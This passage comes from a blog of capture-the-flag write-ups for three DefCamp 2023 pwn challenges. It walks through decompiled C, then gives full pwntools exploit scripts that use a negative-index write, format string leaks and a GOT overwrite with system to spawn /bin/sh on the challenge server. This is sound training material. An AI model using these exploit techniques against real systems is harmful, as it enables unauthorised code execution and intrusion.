<p>Until I decompiled, I thought this challenge might be heap related. But I was completely wrong. lol</p>
<p>There are 6 methods, but I only focused on 2(<code>print_todo</code>, <code>store_todo</code>). </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which entry would you like to read? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your NOTE: %s\n&quot;</span>, &amp;todos[<span class="number">48</span> * v1]); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I always pay attention whenever I see an index. It can refer to memory you didn’t intend. </p>
<img src="/images/231023-d-ctf2023-ALL_PWN/book01.png" width=700/>
<br>

<p>The index 0 starts at 0x555555558140. For debugging convenience, I put AAAA at index 0. :)<br>I can put the index as a negative number, so I can leak the got address.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_todo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In which slot would you like to store the new entry? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sorry but this model only supports 128 NOTE list entries.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your NOTE? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read_line(&amp;todos[<span class="number">48</span> * v1], <span class="number">48LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The same vulnerability as the previous function(<code>print_todo</code>) occurs. But this time, I can overwrite the address. </p>
<p>I decided to overwrite <code>atoi</code> with <code>system</code>. The <code>atoi</code> is good to overwrite <code>system</code>. Becuase It has an argument of pointer. </p>
<p>And luckily it’s located next to <code>open_got</code>. I can simply put <code>open_got</code> and <code>system_addr</code>. :)</p>
<h3 id="Solve-3"><a href="#Solve-3" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./book&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">32692</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./book&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_entry</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store_entry</span>(<span class="params">idx,note</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, idx)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;?&#x27;</span>, note)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;AAAA&#x27;</span>) <span class="comment"># for debugging</span></span><br><span class="line"></span><br><span class="line">print_entry(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;E: &#x27;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;open_got: &#x27;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="comment">#system = leak - 0xc3960</span></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line">system = leak -<span class="number">0xbba50</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(leak)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">store_entry(<span class="string">b&#x27;-4&#x27;</span>, payload )</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="system-leak-39-solves-x2F-247-points"><a href="#system-leak-39-solves-x2F-247-points" class="headerlink" title="system-leak (39 solves &#x2F; 247 points)"></a>system-leak (39 solves &#x2F; 247 points)</h2><blockquote>
<p>Leak the entire system, but wait this is not zeenbleed.<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Easy</code></p>
</blockquote>
<p>This challenge makes me confused. lol<br>There was an FSB, but all mitigation were applied. Since the difficulty level was <code>Easy</code>, I tried to think of it as easy. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">closelog();</span><br></pre></td></tr></table></figure>

<p>This is a part of main. I can find easily <code>bof</code> and <code>fsb</code>. Since now there was no clue, I had to figure out what to do. </p>
<p>I started to print all of stacks, finally I got <code>flag</code>.</p>
<h3 id="Solve-4"><a href="#Solve-4" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>, <span class="number">32063</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">118</span>,<span class="number">1000</span>):</span><br><span class="line">	payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span></span><br><span class="line">	payload = payload.encode()</span><br><span class="line">	write_syslog(payload)</span><br><span class="line">	read_syslog()</span><br><span class="line">	leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">	<span class="built_in">print</span>(i, leak)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="/images/231023-d-ctf2023-ALL_PWN/system-leak01.png" width=600/>
<br>


<h2 id="system-write-33-solves-x2F-287-points"><a href="#system-write-33-solves-x2F-287-points" class="headerlink" title="system-write (33 solves &#x2F; 287 points)"></a>system-write (33 solves &#x2F; 287 points)</h2><blockquote>
<p>Wait what? We can write data, but where?<br><code>Flag format: CTF&#123;sha256&#125;</code><br><code>Hard</code></p>
</blockquote>
<p>This challenge is similar to previous challenge. Everything seems to be the same except for the mitigation.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>Because of <code>fsb</code> and <code>Partial RELRO</code>, I can overwritie something with <code>system</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+220h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n========== MENU ==========&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write input to syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Read syslog&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;==========================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="keyword">if</span> ( idx == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid option. Try again.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( idx == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);  <span class="comment">// bof</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);    <span class="comment">// fsb</span></span><br><span class="line">      closelog();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( idx != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      read_syslog();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>%[^\n]</code> essentially means “read characters until a newline character is encountered.” It is the same as entering a string with <code>gets</code>. So this can cause <code>bof</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">syslog</span><span class="params">(<span class="type">int</span> priority, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man3/syslog.3.html">https://man7.org/linux/man-pages/man3/syslog.3.html</a></li>
</ul>
<p><code>syslog</code> can cause <code>fsb</code>. There was difficulty in leaking the address. So I made a loop for this. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">	payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$p&#x27;</span></span><br><span class="line">	payload = payload.encode()</span><br><span class="line">	write_syslog(payload)</span><br><span class="line">	read_syslog()</span><br><span class="line">	leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">	<span class="built_in">print</span>(i, leak)</span><br></pre></td></tr></table></figure>

<p>I just printed them out one by one to find the libc address and hoped it would be the same as the offset in the remote environment. In the past, when leaking addresses using <code>fsb</code>, I had an experience where the local offset and remote offset were different.</p>
<p>I used it to find the <code>libc</code>.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=__libc_start_main:dc0&amp;l=libc6_2.35-0ubuntu3_amd64">https://libc.blukat.me/?q=__libc_start_main%3Adc0&amp;l=libc6_2.35-0ubuntu3_amd64</a></li>
</ul>
<h3 id="Solve-5"><a href="#Solve-5" class="headerlink" title="Solve"></a>Solve</h3><ol>
<li>Leak the <code>libc address</code> (I leaked the <code>__libc_start_main+128</code>.)</li>
<li>Find the <code>libc version</code> for the <code>system address</code>.</li>
<li>Overwrite <code>fgets@got</code> with <code>sytem</code>.</li>
<li>Send the <code>/bin/sh\x00</code> through <code>fgets</code>. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pri; <span class="comment">// [rsp+6h] [rbp-21Ah] BYREF</span></span><br><span class="line"><span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the log level (LOG_INFO, LOG_WARNING, LOG_ERR, etc.): &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot; %[^\n]&quot;</span>, &amp;pri);    <span class="comment">// buffer overflow</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the message to write to syslog: &quot;</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">syslog((<span class="type">unsigned</span> <span class="type">int</span>)&amp;savedregs - <span class="number">538</span>, s);</span><br></pre></td></tr></table></figure>
<ul>
<li>I added ‘a’*0xa before <code>/bin/sh\x00</code>.</li>
<li>When the <code>fgets</code> is overwrited by <code>system</code>, it is no longer <code>fgets</code>.</li>
<li>This means that before <code>fgets</code> call, the argument must already point to the area where <code>/bin/sh</code> is written.</li>
<li>So, when i write to <code>&amp;pri</code>, I write a dummy as much as 0xa size and put <code>/bin/sh</code>.</li>
<li>However, you can ignore it all and use <code>one_gadget</code>. (For this challenge only)</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./syslog-write&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.159.182.195&#x27;</span>,<span class="number">31921</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./syslog-write&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_syslog</span>(<span class="params">data</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_syslog</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># let&#x27;s find the libc address</span></span><br><span class="line"><span class="string">for i in range(1, 101):</span></span><br><span class="line"><span class="string">	payload = &#x27;%&#x27; + str(i) + &#x27;$p&#x27;</span></span><br><span class="line"><span class="string">	payload = payload.encode()</span></span><br><span class="line"><span class="string">	write_syslog(payload)</span></span><br><span class="line"><span class="string">	read_syslog()</span></span><br><span class="line"><span class="string">	leak = p.recvuntil(b&#x27;==========&#x27;).split(b&#x27;syslog-write: &#x27;)[-1].split(b&#x27;\n\n&#x27;)[0]</span></span><br><span class="line"><span class="string">	print(i, leak)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># local 94</span></span><br><span class="line">write_syslog(<span class="string">b&#x27;%94$p&#x27;</span>)</span><br><span class="line">read_syslog()</span><br><span class="line">libc_leak = p.recvuntil(<span class="string">b&#x27;==========&#x27;</span>).split(<span class="string">b&#x27;syslog-write: &#x27;</span>)[-<span class="number">1</span>].split(<span class="string">b&#x27;\n\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libc_leak)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">7</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;fgets&#x27;</span>] : <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) -<span class="number">128</span> + <span class="number">0x26fa0</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">write_syslog(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xa</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-bof-105-solves-x2F-10-points"><span class="toc-number">1.</span> <span class="toc-text">baby-bof (105 solves &#x2F; 10 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve"><span class="toc-number">1.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bistro-67-solves-x2F-12-points"><span class="toc-number">2.</span> <span class="toc-text">bistro (67 solves &#x2F; 12 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bistro-v2-72-solves-x2F-10-points"><span class="toc-number">3.</span> <span class="toc-text">bistro-v2 (72 solves &#x2F; 10 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#book-39-solves-x2F-247-points"><span class="toc-number">4.</span> <span class="toc-text">book (39 solves &#x2F; 247 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-3"><span class="toc-number">4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-leak-39-solves-x2F-247-points"><span class="toc-number">5.</span> <span class="toc-text">system-leak (39 solves &#x2F; 247 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-4"><span class="toc-number">5.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-write-33-solves-x2F-287-points"><span class="toc-number">6.</span> <span class="toc-text">system-write (33 solves &#x2F; 287 points)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solve-5"><span class="toc-number">6.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&text=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
